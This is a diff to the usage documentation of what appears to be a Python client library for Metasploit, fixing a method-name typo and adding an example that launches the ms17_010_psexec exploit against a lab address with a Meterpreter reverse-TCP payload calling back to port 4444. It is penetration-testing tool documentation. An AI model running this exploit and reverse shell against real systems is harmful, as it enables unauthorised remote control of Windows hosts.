@@ -158,5 +158,20 @@ client.sessions.session('1').run_with_output('arp')
 # >>> '\nArp stuff'
 
 # Run a shell command within a meterpreter session
-client.sessions.sessions('1').run_shell_cmd_with_output('whoami')
+client.sessions.session('1').run_shell_cmd_with_output('whoami')
 
+
+# How to set Payload Options
+# Some exploits need to set payload options, here's an example on how to do so
+exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
+exploit['RHOSTS'] = '172.28.128.13'
+
+# create a payload object as normal
+payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+
+# add paylod specific options
+payload['LHOST'] = '172.28.128.1'
+payload['LPORT'] = 4444
+
+# Execute the exploit with the linked payload, success will return a jobid
+exploit.execute(payload=payload)
